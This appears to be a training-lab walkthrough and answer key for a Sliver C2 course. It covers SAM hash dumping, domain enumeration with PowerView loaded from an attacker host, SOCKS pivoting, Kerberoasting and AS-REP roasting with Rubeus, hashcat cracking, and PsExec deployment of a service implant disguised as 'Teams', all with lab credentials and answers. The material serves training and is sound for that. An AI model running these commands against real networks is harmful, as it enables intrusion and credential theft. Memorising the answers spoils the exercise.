[*] Session 2e04d359 windows-http-beacon-9001 - 10.129.186.84:49734 (web01) - windows/amd64 - Thu, 06 Jun 2024 16:22:39 BST

sliver (windows-http-beacon-9001) > use 2e04d359-627f-445b-b8b3-5c2522cf641a

[*] Active session windows-http-beacon-9001 (2e04d359-627f-445b-b8b3-5c2522cf641a)

sliver (windows-http-beacon-9001) > getsystem

[*] A new SYSTEM session should pop soon...
```

Again, another new beacon callback occurs. Students need to set it as active, then finally dump the hashes from the SAM database via the `hashdump` extension:

Code: shell

```shell
use <ID of SYSTEM beacon>
hashdump
```

```
[*] A new SYSTEM session should pop soon...

[*] Beacon 138082e4 windows-http-beacon-9001 - 10.129.186.84:49748 (web01) - windows/amd64 - Thu, 06 Jun 2024 16:26:32 BST

sliver (windows-http-beacon-9001) > use 138082e4-49a4-45d7-ba30-014b5a2acc40

[*] Active beacon windows-http-beacon-9001 (138082e4-49a4-45d7-ba30-014b5a2acc40)

sliver (windows-http-beacon-9001) > hashdump

[*] Tasked beacon windows-http-beacon-9001 (402e12bd)

[+] windows-http-beacon-9001 completed task 402e12bd

[*] Successfully executed hashdump
[*] Got output:
Administrator:500:Administrator:500:aad3b435b51404eeaad3b435b51404ee:e368973bdcf9dd5219882fdf0777ff0b:::::
Guest:501:Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
DefaultAccount:503:DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
WDAGUtilityAccount:504:WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:02e5a94d265e7d5dc6072839a5641543:::::
normal:1000:normal:1000:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::::
admin:1001:admin:1001:aad3b435b51404eeaad3b435b51404ee:{hidden}:::::
```

The hash for the `admin` user is revealed to be `{hidden}`.

Answer: `a87f3a337d73085c45f9416be5787d86`

# Domain Reconnaissance

## Question 1

### "Submit the relative identifier of the SID for user websec"

To begin their domain reconnaissance, students need to set an active session or beacon under the user context `CHILD\Eric` on `Web01`. Students need to reproduce the steps of the previous section to have the aforementioned user execute a beacon named `ericdomain`, then converted to a session:

```
[*] Session cf6d9e5b ericdomain - 10.129.186.84:50294 (web01) - windows/amd64 - Thu, 06 Jun 2024 18:51:10 BST

sliver (ericdomain) > use cf6d9e5b-ca5d-41b0-ba9e-8e568e4a632a

[*] Active session ericdomain (cf6d9e5b-ca5d-41b0-ba9e-8e568e4a632a)

sliver (ericdomain) >  
```

Then, students need return to their attack host, download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) and start a python http server:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
python3 -m http.server 8080
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-33zfqryexc]─[~/sliver]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-33zfqryexc]─[~/sliver]
└──╼ [★]$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Preparing to pass an argument to the sliver armory's `sharpsh` tool, students need to generate the base64 encoded equivalent of `Get-NetUser -identity websec`:

Code: shell

```shell
echo -n 'get-netuser -identity websec' | base64
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-v0ojr7ieu8]─[~/sliver]
└──╼ [★]$ echo -n 'get-netuser -identity websec' | base64

Z2V0LW5ldHVzZXIgLWlkZW50aXR5IHdlYnNlYw==
```

Students need to use return to their Sliver session, using `sharpsh` to execute the aforementioned base64 encoded command:

```
sharpsh -t 120 -- '-u http://10.10.14.5:8080/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgLWlkZW50aXR5IHdlYnNlYw=='
```

```
sliver (ericdomain) > sharpsh -t 120 -- '-u http://10.10.14.5:8080/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgLWlkZW50aXR5IHdlYnNlYw=='

[*] sharpsh output:

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
description           : Secure web application!
distinguishedname     : CN=team_websec,CN=Users,DC=child,DC=htb,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : team_websec
userprincipalname     : websec@child.htb.local
name                  : team_websec
objectsid             : S-1-5-21-2749819870-3967162335-1946002573-{hidden}
samaccountname        : websec
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 9/21/2022 4:09:51 PM
instancetype          : 4
objectguid            : f4e06f14-db75-4a27-a5f9-c74a0b96ed3e
lastlogon             : 12/31/1600 4:00:00 PM
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dscorepropagationdata : {9/21/2022 4:17:50 PM, 9/21/2022 4:09:51 PM, 1/1/1601 12:00:01 AM}
givenname             : team_websec
whencreated           : 9/19/2022 3:15:47 AM
badpwdcount           : 0
cn                    : team_websec
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 24692
primarygroupid        : 513
pwdlastset            : 9/18/2022 8:15:47 PM
usnchanged            : 26340
```

Referring to the last four digits of the `objectsid`, students will find the relative sid of the `websec` user to be `{hidden}`.

Answer: `1118`

# Domain Reconnaissance

## Question 2

### "Enumerate the domain and submit its domain mode level"

From the active sliver session, students need to utilize `sharpview` alias to enumerate the domain mode level:

Code: shell

```shell
sharpview -- Get-Domain
```

```
sliver (ericdomain) > sharpview -- Get-Domain

[*] sharpview output:
Forest                         : htb.local
DomainControllers              : {dc01.child.htb.local}
Children                       : {}
DomainMode                     : Unknown
DomainModeLevel                : {hidden}
Parent                         : htb.local
PdcRoleOwner                   : dc01.child.htb.local
RidRoleOwner                   : dc01.child.htb.local
InfrastructureRoleOwner        : dc01.child.htb.local
Name                           : child.htb.local
```

The domain mode level is listed as `{hidden}`.

Answer: `7`

# Domain Reconnaissance

## Question 3

### "Use any of the techniques to obtain the maximum password age"

From the active sliver session, students need to utilize the `c2tc-domaininfo` alias to get the maximum password age in the domain:

Code: shell

```shell
c2tc-domaininfo
```

```
sliver (ericdomain) > c2tc-domaininfo

[*] Successfully executed c2tc-domaininfo (coff-loader)
[*] Got output:
--------------------------------------------------------------------
[+] DomainName:
    child.htb.local
[+] DomainGuid:
    {1D8CD513-C06A-4BB9-83FB-CD29334A10BF}
[+] DnsForestName:
    {hidden}
[+] DcSiteName:
    Default-First-Site-Name
[+] ClientSiteName:
    Default-First-Site-Name
[+] DomainControllerName (PDC):
    \\dc01.child.htb.local
[+] DomainControllerAddress (PDC):
    \\172.16.1.15
[+] Default Domain Password Policy:
    Password history length: 24
    Maximum password age (d): {hidden}
    Minimum password age (d): 1
    Minimum password length: 7
[+] Account Lockout Policy:
    Account lockout threshold: 5
    Account lockout duration (m): 10
    Account lockout observation window (m): 10
[+] NextDc DnsHostName:
    dc01.child.htb.local
--------------------------------------------------------------------
```

The maximum password age is shown to be `{hidden}`.

Answer: `42`

# Domain Reconnaissance

## Question 4

### "Submit the DNS forest name"

From the active sliver session, students need to utilize `c2tc-domaininfo` alias to get the DNS forest name:

Code: shell

```shell
c2tc-domaininfo
```

```
sliver (ericdomain) > c2tc-domaininfo

[*] Successfully executed c2tc-domaininfo (coff-loader)
[*] Got output:
--------------------------------------------------------------------
[+] DomainName:
    child.htb.local
[+] DomainGuid:
    {1D8CD513-C06A-4BB9-83FB-CD29334A10BF}
[+] DnsForestName:
    {hidden}
[+] DcSiteName:
    Default-First-Site-Name
[+] ClientSiteName:
    Default-First-Site-Name
[+] DomainControllerName (PDC):
    \\dc01.child.htb.local
[+] DomainControllerAddress (PDC):
    \\172.16.1.15
[+] Default Domain Password Policy:
    Password history length: 24
    Maximum password age (d): {hidden}
    Minimum password age (d): 1
    Minimum password length: 7
[+] Account Lockout Policy:
    Account lockout threshold: 5
    Account lockout duration (m): 10
    Account lockout observation window (m): 10
[+] NextDc DnsHostName:
    dc01.child.htb.local
--------------------------------------------------------------------
```

The `DnsForestName` is revealed to be `{hidden}`.

Answer: `htb.local`

# Domain Reconnaissance

## Question 5

### "Submit the external domain admin (username)"

Students need to first base64 encode the command `Get-NetUser | select samaccountname,description`:

Code: shell

```shell
echo -n 'get-netuser | select  samaccountname,description' | base64
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-33zfqryexc]─[~/sliver]
└──╼ [★]$ echo -n 'get-netuser | select  samaccountname,description' | base64

Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u
```

Subsequently, they need to use the `sharpsh` alias for enumerating the users in the domain within the active sliver session, making sure that the http server is running with PowerView.ps1 being available:

Code: shell

```shell
sharpsh -t 120 -- '-u http://10.10.14.124:8080/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
```

```
sliver (ericdomain) > sharpsh -t 120 -- '-u http://10.10.14.124:8080/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'

[*] sharpsh output:

samaccountname description                                             
-------------- -----------                                             
Administrator  Built-in account for administering the computer/domain  
Guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account                 
svc_sql        SQL Server Manager.                                     
alice          User who can monitor srv01 via RDP                      
bob            User who can manage srv02 via WinRM                     
carrot         I am the king!                                          
david          My password is super safe!                              
websec         Secure web application!                                 
mobilesec      Secure mobile application!                              
eric           For learning purpose.                                   
{hidden}       External domain admin   
```

Student will see `{hidden}` is labeled as the external domain admin.

Answer: `frank`

# Domain Reconnaissance

## Question 6

### "Submit the internal IP address of WEB01"

From the active sliver session, students need to run `ifconfig` to get information about the network adapters on the target machine:

Code: shell

```shell
ifconfig
```

```
sliver (ericdomain) > ifconfig

+------------------------------------------+
| Ethernet0 2                              |
+------------------------------------------+
| # | IP Addresses     | MAC Address       |
+---+------------------+-------------------+
| 6 | 10.129.186.84/16 | 00:50:56:94:d5:5a |
+------------------------------------------+

+----------------------------------------+
| Ethernet1 2                            |
+----------------------------------------+
| # | IP Addresses   | MAC Address       |
+---+----------------+-------------------+
| 8 | {hidden}/16 | 00:50:56:94:ae:e2 |
+----------------------------------------+
1 adapters not shown.
```

Answer: `172.16.1.11`

# Pivoting

## Question 1

### "Replicate the methods in the section. Is the user svc\_sql an administrator on SRV02 (Yes/No)"

To begin, students need to either continue operating from within the sliver session used from the previous section, or obtain a new one by repeating the steps shown in the `Assumed Breach` section of this walkthrough.

In the example below, the user `CHILD/eric` was used to execute an HTTP beacon named `pivot-eric`, which was then converted to a session via the `interactive` command:

```
sliver (hello) > info

        Session ID: 23ee526f-84f5-40ce-a5dc-4931431917bc
              Name: hello
          Hostname: web01
              UUID: 72ad3042-64ae-147a-f0dc-7c1e09186cfa
          Username: CHILD\eric
               UID: S-1-5-21-2749819870-3967162335-1946002573-1122
               GID: S-1-5-21-2749819870-3967162335-1946002573-513
               PID: 3164
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.124:9003
    Remote Address: 10.129.17.14:49710
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Fri May 17 07:21:04 BST 2024 (20m13s ago)
      Last Checkin: Fri May 17 07:41:15 BST 2024 (2s ago)
```

Now, from the active session, students need to start the SOCKS5 proxy:

Code: shell

```shell
socks5 start -P 1080
```

```
sliver (pivot-eric) > socks5 start -P 1080

[*] Started SOCKS5 127.0.0.1 1080  
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

Students need to configure their `proxychains.conf` file to match, then confirm the changes with `tail`:

Code: shell

```shell
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
sudo tail /etc/proxychains.conf
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-v0ojr7ieu8]─[~/sliver]
└──╼ [★]$ sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'

┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-v0ojr7ieu8]─[~/sliver]
└──╼ [★]$ sudo tail /etc/proxychains.conf 

#
#       proxy types: http, socks5, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	127.0.0.1 1080
```

Confirming that `web01` now serves as a pivot host to the internal network, students need to use `crackmapexec` and test the credentials for the `svc_sql` user against the `SRV02` host:

Code: shell

```shell
proxychains cme smb 172.16.1.13 -u 'svc_sql' -p 'jkhnrjk123!'
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-v0ojr7ieu8]─[~/sliver]
└──╼ [★]$ proxychains cme smb 172.16.1.13 -u 'svc_sql' -p 'jkhnrjk123!'

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:135  ...  OK
SMB         172.16.1.13     445    SRV02            [*] Windows 10.0 Build 17763 x64 (name:SRV02) (domain:child.htb.local) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
SMB         172.16.1.13     445    SRV02            [+] child.htb.local\svc_sql:jkhnrjk123! (Pwn3d!)
```

Students will see the message `Pwn3d!` in the crackmapexec output after authenticating to `172.16.1.13`, indicating that `svc_sql` is indeed an administrator on `SRV02`.

Answer: `yes`

# Kerberos Exploitaton

## Question 1

### "Take advantage of the obtained hash of the user Alice and submit the password"

To begin, students need to either continue operating from within the sliver session used from the previous section, or obtain a new one by repeating the steps shown in the `Assumed Breach` section of this walkthrough.

In the example below, the user `CHILD/eric` executed an HTTP beacon named `eric-kerberoasted`, which was then converted to a session via the `interactive` command:

```
[*] Using beacon's active C2 endpoint: https://10.10.14.5:9008
[*] Tasked beacon eric-kerberoasted (ef1cad5e)

[*] Session 7c43e43b eric-kerberoasted - 10.129.205.234:49785 (web01) - windows/amd64 - Fri, 07 Jun 2024 04:26:04 BST

sliver (eric-kerberoasted) > use 7c43e43b-6fce-452f-bf37-7ce76072c349

[*] Active session eric-kerberoasted (7c43e43b-6fce-452f-bf37-7ce76072c349)

sliver (eric-kerberoasted) >
```

From the active session, students need to use the [inline-execute-assembly](https://github.com/sliverarmory/InlineExecute-Assembly) extension utility alongside `Rubeus.exe` and Kerberoast the `alice` user:

Code: shell

```shell
inline-execute-assembly -t 300  /path/toRubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
```

```
sliver (eric-kerberoasted) > inline-execute-assembly -t 300  Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'

[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 447031 bytes to memory
[+] Using arguments: kerberoast /format:hashcat /user:alice /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : alice
[*] Target Domain          : child.htb.local
[*] Searching path 'LDAP://dc01.child.htb.local/DC=child,DC=htb,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=alice)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : alice
[*] DistinguishedName      : CN=alice,CN=Users,DC=child,DC=htb,DC=local
[*] ServicePrincipalName   : rdp/web01.child.htb.local
[*] PwdLastSet             : 9/14/2022 12:33:13 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*alice$child.htb.local$rdp/web01.child.htb.local@child.htb.local*$5E903BCE036C3E6CBE99F051D98E4F28$8773E7502A11699469AD985ED8587DA507704283C38E542B3B7C7271FC072D31B7AEF41750B2B951C22757C192567110062334EC5484EDEA2B1CE85ACB2FBFD9E28C454C7B990045CE31EF2823D45F04EF1C8252857D8AD2860FDCF177CCC7F00FBCF8B0A028D28E5F7B943D2B599A139DE4DFCA7C651AB26033D2BEF32CF5995381C21FC89C562DF568C536827B3DA2E53EC70D39C38A2146A6A6DA2706427D8BFD28B9857712D0193722C8F252EEDD827111309D67AF145070BA0D1D38C2CD4B17EDB81CD4A59847208F5A0B3F1DB122F2E2374840500CFBB93B20EB33466C5886CD5D9225DE950D56B67F1C26C1C0C5DD0F2C85F34E5A4955D190405F2A60B6BA235411279F58A6016DFEA7F9C5AB80738883A4531694B44233C843B76990E3C1FBB4C63A0325ACD10262FD4CE1B9B09B56B6B3F452E6EA43261DF1CAEB566466FDCB726101BC5ADDB8FC00E1DDC975EB5C85949FB856A3C24BE8C68F6D746161E0167DEA8EDC15A807CADF55730BAA5EB812555EF5FD9A0CED502FD2B8FB624AB7EB36B9419EFE01EE2401A451F8505D8A7CFA2B341798EB50EF8A790CDE9E97A5B04FA91B9AB1A64598D6CD613E0CABEEE5AA6333252731252D60F455EB4C01D995AEBC10B88628B67F9A293543C7E33623CC97DE15874C122C702A909ADB99A389CF3A034A2C67F276250DC8B4F63AABFB91DA8E10959CFD2A0C968A2BF321900963E88913A685A53A6EF33596A9B869746EA52A4C5B3D6B5AC8C2D1B897192BBE5613FD6B1C4361A8AFF44C32CDCCD20BFD18C7E01FAA43C1CA779DF4247E1602AAB5F5F5BA2D3053EA61F03DB01BAAF14EB59EEAB154340EB338F3F754C98534351231E3842A95C18DAA4720C70BB1F4E7E9F988EEFCB03C222FF153590A3F374054944A6627636BB032A2036FF9F6585A95F08B3ABF2308FF4C9DE2F7EBB20AD8F973E3A71056AE38AD9E851A1260FAA6C73F5A4EE6B425A3812DC34B41417A99AAC33984BFE37F9CA5330980508117E44AAD99AD2E4C6BC6EBC7D5761388BCFD96F9A8B3382911F869C3494E80BAF1AD48F9CC2BF9D96E454391F25C12AD742D7A9578CA7E8580EAD69127D9A3B8334717B0AF1A6F08FA775DF0A53B24AA1D0DBBC3A2DD4357A390035F3D34F51DCDE625BEFB416DFEA6F539921424239D65BF3BC364C55554C813B03F1815938E2F327508FBAFF95706D0CB5C5305A8E3B2A42D8BD0CF02C511504FBD846B46588D407CA10007BD77991EED2AC80BB019CD4D3DCD9972A08BB8552304B0BD7FE2806B59BE53139D938CB2FBADBEA10F9BAC17D357AF2CB8503973006FF61C4A4776226960D6A16A7F040D8B90DD8B224EC8110D8611C9D0BA204118E7D7289247CC34C27E6190B3876EFF17DBDBE68308518B545E71DF7259FD335DE49BCE0F61112936

[+] inlineExecute-Assembly Finished
```

Students need to copy and paste the hash into a file, `alice.hash`, then subsequently crack it with `hashcat`:

Code: shell

```shell
hashcat -a 0 -m 13100 alice.hash /usr/share/wordlists/rockyou.txt 
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-clakmkgafs]─[~/sliver]
└──╼ [★]$ hashcat -a 0 -m 13100 alice.hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>
$krb5tgs$23$*alice$child.htb.local$rdp/web01.child.htb.local@child.htb.local*$5e903bce036c3e6cbe99f051d98e4f28$8773e7502a11699469ad985ed8587da507704283c38e542b3b7c7271fc072d31b7aef41750b2b951c22757c192567110062334ec5484edea2b1ce85acb2fbfd9e28c454c7b990045ce31ef2823d45f04ef1c8252857d8ad2860fdcf177ccc7f00fbcf8b0a028d28e5f7b943d2b599a139de4dfca7c651ab26033d2bef32cf5995381c21fc89c562df568c536827b3da2e53ec70d39c38a2146a6a6da2706427d8bfd28b9857712d0193722c8f252eedd827111309d67af145070ba0d1d38c2cd4b17edb81cd4a59847208f5a0b3f1db122f2e2374840500cfbb93b20eb33466c5886cd5d9225de950d56b67f1c26c1c0c5dd0f2c85f34e5a4955d190405f2a60b6ba235411279f58a6016dfea7f9c5ab80738883a4531694b44233c843b76990e3c1fbb4c63a0325acd10262fd4ce1b9b09b56b6b3f452e6ea43261df1caeb566466fdcb726101bc5addb8fc00e1ddc975eb5c85949fb856a3c24be8c68f6d746161e0167dea8edc15a807cadf55730baa5eb812555ef5fd9a0ced502fd2b8fb624ab7eb36b9419efe01ee2401a451f8505d8a7cfa2b341798eb50ef8a790cde9e97a5b04fa91b9ab1a64598d6cd613e0cabeee5aa6333252731252d60f455eb4c01d995aebc10b88628b67f9a293543c7e33623cc97de15874c122c702a909adb99a389cf3a034a2c67f276250dc8b4f63aabfb91da8e10959cfd2a0c968a2bf321900963e88913a685a53a6ef33596a9b869746ea52a4c5b3d6b5ac8c2d1b897192bbe5613fd6b1c4361a8aff44c32cdccd20bfd18c7e01faa43c1ca779df4247e1602aab5f5f5ba2d3053ea61f03db01baaf14eb59eeab154340eb338f3f754c98534351231e3842a95c18daa4720c70bb1f4e7e9f988eefcb03c222ff153590a3f374054944a6627636bb032a2036ff9f6585a95f08b3abf2308ff4c9de2f7ebb20ad8f973e3a71056ae38ad9e851a1260faa6c73f5a4ee6b425a3812dc34b41417a99aac33984bfe37f9ca5330980508117e44aad99ad2e4c6bc6ebc7d5761388bcfd96f9a8b3382911f869c3494e80baf1ad48f9cc2bf9d96e454391f25c12ad742d7a9578ca7e8580ead69127d9a3b8334717b0af1a6f08fa775df0a53b24aa1d0dbbc3a2dd4357a390035f3d34f51dcde625befb416dfea6f539921424239d65bf3bc364c55554c813b03f1815938e2f327508fbaff95706d0cb5c5305a8e3b2a42d8bd0cf02c511504fbd846b46588d407ca10007bd77991eed2ac80bb019cd4d3dcd9972a08bb8552304b0bd7fe2806b59be53139d938cb2fbadbea10f9bac17d357af2cb8503973006ff61c4a4776226960d6a16a7f040d8b90dd8b224ec8110d8611c9d0ba204118e7d7289247cc34c27e6190b3876eff17dbdbe68308518b545e71df7259fd335de49bce0f61112936:{hidden}
```

The password for `alice` is shown to be `{hidden}`.

Answer: `beautiful1`

# Kerberos Exploitaton

## Question 2

### "Take advantage of the obtained hash of the user Bob and submit the password"

With the session still open from the previous challenge question, students need to use the [execute-inline-assembly](https://github.com/sliverarmory/InlineExecute-Assembly) utility alongside `Rubeus.exe` to AS-Reproast the `bob` user:

Code: shell

```shell
inline-execute-assembly -t 240 /path/to/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap
```

```
sliver (eric-kerberoasted) > inline-execute-assembly -t 240 /home/htb-ac-594497/sliver/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'

[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 447029 bytes to memory
[+] Using arguments: asreproast /format:hashcat /user:bob /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: AS-REP roasting

[*] Target User            : bob
[*] Target Domain          : child.htb.local

[*] Searching path 'LDAP://dc01.child.htb.local/DC=child,DC=htb,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=bob))'
[*] SamAccountName         : bob
[*] DistinguishedName      : CN=bob,CN=Users,DC=child,DC=htb,DC=local
[*] Using domain controller: dc01.child.htb.local (172.16.1.15)
[*] Building AS-REQ (w/o preauth) for: 'child.htb.local\bob'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$23$bob@child.htb.local:88914E154E976D237623CD2DB424DFB9$FE36238F255CB8B76C689E9137236548D4B6AF43B6CD8A88A98D809DD19E2E6BB307F87B146E9A56EDB703E1081CDB12B497F6C7FFA4B764D43757503C178825F6CB3EEDA0D9892ED7B820CD2CEB801AD9091E367B0C27AA18B403683A0846871A9005991FDC0B53CEDFD63E55A8B87C2F8BE6A1B16849A2994F8C10EA6EBAEF7A5092CF71FB46E839B2912D006CEA2A46BCBC8153CFA6A32118C58E5705E64B57DAEDCEB163A73F4DA84DB0245B509A871814DBDDAF4CB5E64D4F7E8FB8233957C4A79B67DFA4EB3A75AB1F908C2C4F0DFCE6E0B94EE70A3B718D089EDFDC6E460D2174CAAB925460C87D5F9491DC71350E

[+] inlineExecute-Assembly Finished
```

Students need to copy and paste the hash into a file, `bob.hash`, then subsequently crack it with \`\` `hashcat`:

Code: shell

```shell
hashcat -a 0 -m 18200 bob.hash /usr/share/wordlists/rockyou.txt
```

```
┌─[eu-academy-1]─[10.10.14.5]─[htb-ac-594497@htb-clakmkgafs]─[~/sliver]
└──╼ [★]$ hashcat -a 0 -m 18200 bob.hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$bob@child.htb.local:88914e154e976d237623cd2db424dfb9$fe36238f255cb8b76c689e9137236548d4b6af43b6cd8a88a98d809dd19e2e6bb307f87b146e9a56edb703e1081cdb12b497f6c7ffa4b764d43757503c178825f6cb3eeda0d9892ed7b820cd2ceb801ad9091e367b0c27aa18b403683a0846871a9005991fdc0b53cedfd63e55a8b87c2f8be6a1b16849a2994f8c10ea6ebaef7a5092cf71fb46e839b2912d006cea2a46bcbc8153cfa6a32118c58e5705e64b57daedceb163a73f4da84db0245b509a871814dbddaf4cb5e64d4f7e8fb8233957c4a79b67dfa4eb3a75ab1f908c2c4f0dfce6e0b94ee70a3b718d089edfdc6e460d2174caab925460c87d5f9491dc71350e:{hidden}
```

Students will find that bob's password is `{hidden}`.

Answer: `1q2w3e4r`

# Lateral Movement

## Question 1

### "What is the process integrity level of the spawned session through PsExec"

To begin, students need to either continue operating from within the sliver session used from the previous section, or obtain a new one by repeating the steps shown in the `Assumed Breach` section of this walkthrough.

In the example seen below, the user `CHILD/eric` executed an HTTP beacon named `eric-psexec`:

```
sliver (eric-psexec) > info

        Session ID: de883732-5d34-42de-8a5f-d1e6365aea67
              Name: eric-psexec
          Hostname: web01
              UUID: 503f1442-5fb3-2082-e00d-69bf78d611eb
          Username: CHILD\eric
               UID: S-1-5-21-2749819870-3967162335-1946002573-1122
               GID: S-1-5-21-2749819870-3967162335-1946002573-513
               PID: 6340
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.96:9009
    Remote Address: 10.129.205.234:49729
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Fri Jun  7 16:00:56 BST 2024 (14m28s ago)
      Last Checkin: Fri Jun  7 16:15:21 BST 2024 (3s ago)
```

Students need to first use `make-token` and impersonate the `svc_sql` user, who is a local admin on both the `SRV01` and `SRV02` hosts:

Code: shell

```shell
make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
```

```
sliver (eric-psexec) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

[*] Successfully impersonated child.htb.local\svc_sql. Use \`rev2self\` to revert to your previous token.
```

Next, students need to start a pivot listener, which will be used to allow communication between `SRV01` and `WEB01`:

Code: shell

```shell
pivots tcp --bind 172.16.1.11
```

```
sliver (eric-psexec) > pivots tcp --bind 172.16.1.11

[*] Started tcp pivot listener 172.16.1.11:9898 with id 1
```

Subsequently, students need to create an implant for the corresponding pivot listener, specifying the `service` format when generating:

Code: shell

```shell
generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot
```

```
sliver (eric-psexec) > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac-594497/sliver/psexec-pivot.exe
```

Now, students need to use the `psexec` utility, providing the path to the recently created `psexec-pivot.exe` implant and choosing the `srv01.child.htb.local` host for the attack:

Code: shell

```shell
psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
```

```
sliver (eric-psexec) >  psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local

[*] Uploaded service binary to \\srv01.child.htb.local\C$\windows\temp\GLAND9oo.exe
[*] Waiting a bit for the file to be analyzed ...
[*] Successfully started service on srv01.child.htb.local (c:\windows\temp\GLAND9oo.exe)
[*] Successfully removed service Teams on srv01.child.htb.local

